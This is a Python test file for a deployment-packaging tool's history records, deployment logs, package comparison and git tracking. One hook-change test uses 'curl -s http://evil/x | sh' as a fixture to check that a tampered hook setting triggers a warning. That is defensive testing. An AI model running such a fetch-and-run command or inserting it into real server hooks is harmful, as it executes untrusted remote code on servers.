"""기록: 패키지마다 기록 파일을 남기고, 예전 패키지는 보고서에서 읽는다."""
import json
from datetime import datetime

from shipkit import history, packager, workflow
from shipkit.models import ChangeType, SourceInfo

from conftest import make_config, write


def _package(maven_project, out, lines, source=None, now=None):
    project = make_config(maven_project, out).projects["erp"]
    changes, src = workflow.collect_lines(lines, "직접 입력 (붙여넣기)")
    source = source or src
    entries = workflow.plan(project, changes, source)
    return project, packager.build_package(project, entries, source, source_changes=changes, now=now)


def test_hooks_change_warning_against_previous_package(maven_project, tmp_path):
    """서버 명령 설정이 지난 패키지 때와 다르면 경고한다 (저장소의 hooks 를 누가 바꾼 것을 놓치지 않게)."""
    from shipkit import hooks
    out = tmp_path / "out"
    jsp = ["src/main/webapp/WEB-INF/views/user/list.jsp"]

    def build(hooks_cfg, now):
        project = make_config(maven_project, out, hooks=hooks_cfg).projects["erp"]
        changes, source = workflow.collect_lines(jsp, "t")
        return packager.build_package(project, workflow.plan(project, changes, source), source,
                                      source_changes=changes, now=now), source

    first = {"post_apply": ["sudo systemctl restart tomcat"]}
    result, source = build(first, datetime(2026, 10, 1, 9, 0))
    assert not [w for w in source.warnings if "hooks" in w]           # 비교할 지난 패키지가 없음
    assert history.read_record(result.out_dir).hooks_config == {"post_apply": [{"run": "sudo systemctl restart tomcat", "when": ""}]}

    result, source = build(first, datetime(2026, 10, 2, 9, 0))
    assert not [w for w in source.warnings if "hooks" in w]           # 같으면 조용
    changed = {"pre_apply": ["curl -s http://evil/x | sh"], "post_apply": [
        {"run": "sudo systemctl restart tomcat", "when": "pom.xml"}]}
    result, source = build(changed, datetime(2026, 10, 3, 9, 0))
    warning = next(w for w in source.warnings if "hooks" in w)
    assert "지난 패키지 2026-10-02-0900 때와 다릅니다" in warning
    assert "pre_apply 추가: curl -s http://evil/x | sh" in warning and "post_apply 조건 바뀜" in warning
    assert "(when: pom.xml)" in warning
    result, source = build({}, datetime(2026, 10, 4, 9, 0))
    assert "post_apply 빠짐: sudo systemctl restart tomcat" in next(w for w in source.warnings if "hooks" in w)

    assert hooks.describe_changes({}, {}) == [] and hooks.describe_changes({"post_apply": [{"run": "a"}]}, {"post_apply": [{"run": "a", "when": ""}]}) == []
    # 기록 파일에 hooks_config 가 없는 예전 패키지와는 비교하지 않는다
    data = json.loads((result.out_dir / history.RECORD_FILE).read_text(encoding="utf-8"))
    del data["hooks_config"]
    (result.out_dir / history.RECORD_FILE).write_text(json.dumps(data), encoding="utf-8")
    project = make_config(maven_project, out, hooks=first).projects["erp"]
    assert history.hooks_changed_since(project) == (None, [])


def test_deployments_appended_and_summarized(maven_project, tmp_path):
    """화면에서 서버에 올린 결과는 기록 파일에 쌓이고, 서버마다 마지막 상태와 '지금 반영된 서버'를 알 수 있다."""
    _, result = _package(maven_project, tmp_path / "out", ["src/main/webapp/WEB-INF/views/user/list.jsp"],
                         now=datetime(2026, 10, 1, 9, 0))
    folder = result.out_dir
    when = datetime(2026, 10, 1, 10, 0)
    history.append_deployment(folder, "개발", "deployer@10.0.0.5", "check", 0, "/home/d/deploy/p", "/srv/app", when)
    history.append_deployment(folder, "개발", "deployer@10.0.0.5", "apply", 0, "/home/d/deploy/p", "/srv/app", when)
    history.append_deployment(folder, "운영", "app@prod", "apply", 1, "/home/app/deploy/p", "/srv/app", when)
    r = history.read_record(folder)
    assert [d["action"] for d in r.deployments] == ["check", "apply", "apply"]
    assert r.deployments[0]["at"] == "2026-10-01T10:00:00" and r.deployments[2]["ok"] is False
    states = r.server_states()
    assert set(states) == {"개발", "운영"} and states["개발"]["action"] == "apply" and states["개발"]["ok"]
    assert [d["server"] for d in r.applied_servers()] == ["개발"]       # 운영은 실패했으니 반영된 서버가 아님
    history.append_deployment(folder, "개발", "deployer@10.0.0.5", "rollback", 0, "/home/d/deploy/p", "/srv/app")
    r = history.read_record(folder)
    assert r.applied_servers() == [] and r.server_states()["개발"]["action"] == "rollback"
    assert "개발" in r.search_text()
    data = json.loads((folder / history.RECORD_FILE).read_text(encoding="utf-8"))
    assert data["project"] == "erp" and len(data["deployments"]) == 4   # 다른 내용은 그대로


def test_record_written_and_listed(maven_project, tmp_path):
    out = tmp_path / "out"
    _, first = _package(maven_project, out, ["src/main/webapp/WEB-INF/views/user/list.jsp"],
                        now=datetime(2026, 10, 1, 9, 0))
    mr = {"state": "merged", "merged_at": "", "source_branch": "f", "target_branch": "main", "file_count": 1}
    source = SourceInfo(kind="gitlab-mr", description="GitLab MR !12, !15", merge_requests=[
        dict(mr, iid=12, ref="!12", title="사용자 목록", author="kim", web_url="https://g/12", commit_sha="a"),
        dict(mr, iid=15, ref="!15", title="정렬", author="lee", web_url="https://g/15", commit_sha="b")])
    project, second = _package(maven_project, out, ["src/main/java/com/acme/User.java", "D\tsrc/main/webapp/old.jsp",
                                                    "src/main/webapp/nope.jsp"], source=source,
                               now=datetime(2026, 10, 2, 9, 0))

    data = json.loads((second.out_dir / history.RECORD_FILE).read_text(encoding="utf-8"))
    assert data["counts"]["error"] == 1 and data["source"]["requests"][1]["ref"] == "!15"
    assert history.RECORD_FILE not in (second.out_dir / "checksums.sha256").read_text(encoding="utf-8")

    records = history.list_records(project)
    assert [r.name for r in records] == [second.out_dir.name, first.out_dir.name]  # 최근 것부터
    r = records[0]
    assert r.request_kind == "gitlab" and r.counts["error"] == 1 and r.has_record
    assert "WEB-INF/classes/com/acme/User.class" in r.applied and r.deletes == ["old.jsp"]
    assert "M\tsrc/main/java/com/acme/User.java" in r.changes and "D\tsrc/main/webapp/old.jsp" in r.changes
    assert "user.class" in r.search_text() and "정렬" in r.search_text()

    # 기록의 변경 목록을 그대로 붙여넣으면 같은 변경이 된다 (다시 만들기)
    again, _ = workflow.collect_lines(r.changes, "다시 만들기")
    assert {(c.path, c.change) for c in again} >= {("src/main/webapp/old.jsp", ChangeType.DELETED)}

    # MR 별 배포 기록 (배포 화면의 '배포됨' 배지): 패키지만 만든 것과 서버에 반영한 것을 구분한다
    hist = history.request_history(project, "gitlab")
    assert hist[12]["package"] == second.out_dir.name and hist[12]["servers"] == [] and 15 in hist
    assert history.request_history(project, "github") == {}
    assert history.current_on_server(project, "운영") is None
    history.append_deployment(second.out_dir, "운영", "a@h", "apply", 0, "/d/p", "/app/ROOT", when=datetime(2026, 10, 2, 10, 0))
    assert history.request_history(project, "gitlab")[12]["servers"] == ["운영"]
    rec, state = history.current_on_server(project, "운영")
    assert rec.name == second.out_dir.name and state["at"].startswith("2026-10-02T10:00")
    history.append_deployment(second.out_dir, "운영", "a@h", "rollback", 0, "/d/p", "/app/ROOT")   # 되돌리면 빠진다
    assert history.current_on_server(project, "운영") is None
    assert history.request_history(project, "gitlab")[12]["servers"] == []
    history.append_deployment(first.out_dir, "운영", "a@h", "apply", 0, "/d/p", "/app/ROOT")
    assert history.current_on_server(project, "운영")[0].name == first.out_dir.name


def test_compare_records_and_current_by_server(maven_project, tmp_path):
    """두 패키지 비교: 한쪽에만 있는 파일, 내용이 다른 파일(체크섬), 지울 파일 차이. 서버별 현재 패키지."""
    out = tmp_path / "out"
    jsp = "src/main/webapp/WEB-INF/views/user/list.jsp"
    project, a = _package(maven_project, out, [jsp, "src/main/java/com/acme/User.java", "D\tsrc/main/webapp/old.jsp"],
                          now=datetime(2026, 10, 1, 9, 0))
    write(maven_project / jsp, "<%-- changed --%>")
    _, b = _package(maven_project, out, [jsp, "src/main/resources/mapper/user.xml"], now=datetime(2026, 10, 2, 9, 0))
    ra, rb = history.read_record(a.out_dir), history.read_record(b.out_dir)
    cmp = history.compare_records(ra, rb)
    assert cmp.changed == ["WEB-INF/views/user/list.jsp"] and cmp.same == 0
    assert all(p.startswith("WEB-INF/classes/com/acme/User") for p in cmp.only_a) and cmp.only_b == ["WEB-INF/classes/mapper/user.xml"]
    assert cmp.deletes_only_a == ["old.jsp"] and cmp.deletes_only_b == []
    same = history.compare_records(ra, ra)
    assert same.changed == [] and same.only_a == [] and same.same == len(ra.applied)

    records = history.list_records(project)
    assert history.current_by_server(records) == {}
    history.append_deployment(a.out_dir, "운영", "a@h", "apply", 0, "/d/p", "/app/ROOT")
    history.append_deployment(b.out_dir, "개발", "a@h", "apply", 0, "/d/p", "/app/ROOT")
    history.append_deployment(b.out_dir, "운영", "a@h", "apply", 1, "/d/p", "/app/ROOT")   # 실패한 반영은 현재가 아니다
    assert history.current_by_server(history.list_records(project)) == {"개발": b.out_dir.name, "운영": a.out_dir.name}


def test_old_package_without_record(tmp_path):
    folder = tmp_path / "out" / "2026-09-30-1700"
    write(folder / "manifest.txt", "WEB-INF/a.jsp\nWEB-INF/b.jsp\n")
    write(folder / "delete.txt", "WEB-INF/old.jsp\n")
    write(folder / "shipkit.sh", "#!/bin/bash")
    write(folder / "report.md", "# 배포 패키지 보고서 - erp\n\n- **생성 시각**: 2026-09-30 17:00:05\n"
                                "- **서버 배포 경로**: `/app/ROOT`\n- **변경 출처**: GitLab MR !7, !9\n")
    write(tmp_path / "out" / "not-a-package" / "readme.txt", "x")
    r = history.read_record(folder)
    assert not r.has_record and r.created_at == datetime(2026, 9, 30, 17, 0, 5)
    assert r.server_path == "/app/ROOT" and r.source_kind == "gitlab-mr"
    assert [q["iid"] for q in r.requests] == [7, 9] and r.deletes == ["WEB-INF/old.jsp"]
    assert history.read_record(tmp_path / "out" / "not-a-package") is None


def _git(root, *args):
    import subprocess
    subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@t", *args],
                   check=True, capture_output=True)
    return subprocess.run(["git", "-C", str(root), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()


def test_record_keeps_head_and_since_last_package(maven_project, tmp_path):
    """패키지 기록에 그때의 HEAD 를 남기고, 다음 배포 때 '지난 배포 이후' 범위와 커밋 묶음으로 쓴다."""
    import shutil

    if shutil.which("git") is None:
        import pytest
        pytest.skip("git 이 없습니다")
    out = tmp_path / "out"
    project = make_config(maven_project, out).projects["erp"]
    assert workflow.since_last_package(project) is None                      # 기록 없음 (git 저장소도 아직 아님)

    _git(maven_project, "init", "-q", "-b", "main")
    _git(maven_project, "add", "-A")
    first = _git(maven_project, "commit", "-q", "-m", "first")
    project, result = _package(maven_project, out, ["src/main/webapp/WEB-INF/views/user/list.jsp"])
    rec = history.read_record(result.out_dir)
    assert rec.git_head == first and rec.git_branch == "main"
    assert json.loads((result.out_dir / history.RECORD_FILE).read_text(encoding="utf-8"))["git"]["head"] == first

    last = workflow.since_last_package(project)
    assert last is not None and last.head == first and last.ahead == 0 and last.rev_range == f"{first[:9]}..HEAD"
    assert last.name == result.out_dir.name and "이후 커밋 0개" in last.text

    jsp = maven_project / "src/main/webapp/WEB-INF/views/user/list.jsp"
    write(jsp, "v2")
    write(maven_project / "src/main/webapp/js/new.js", "x")
    second = _git(maven_project, "commit", "-q", "-am", "second")
    _git(maven_project, "add", "-A")
    third = _git(maven_project, "commit", "-q", "-m", "third")
    last = workflow.since_last_package(project)
    assert last.ahead == 2
    changes, source = workflow.collect_git(project, last.rev_range)
    assert sorted(c.path for c in changes) == ["src/main/webapp/WEB-INF/views/user/list.jsp", "src/main/webapp/js/new.js"]

    changes, source = workflow.collect_commits(project, [third, second[:7]])     # 순서 상관없이, 짧은 sha 도
    assert source.kind == "git-commits" and source.description == f"git 커밋 2개: {second[:7]}, {third[:7]}"
    assert sorted((c.change, c.path) for c in changes) == [
        (ChangeType.ADDED, "src/main/webapp/js/new.js"), (ChangeType.MODIFIED, "src/main/webapp/WEB-INF/views/user/list.jsp")]
    assert not source.warnings
    changes, source = workflow.collect_commits(project, [second])
    assert [c.path for c in changes] == ["src/main/webapp/WEB-INF/views/user/list.jsp"]
    import pytest
    with pytest.raises(workflow.InputError):
        workflow.collect_commits(project, ["", " "])

    (result.out_dir / history.RECORD_FILE).unlink()                          # 기록 없는 예전 패키지만 있으면 None
    assert workflow.since_last_package(project) is None
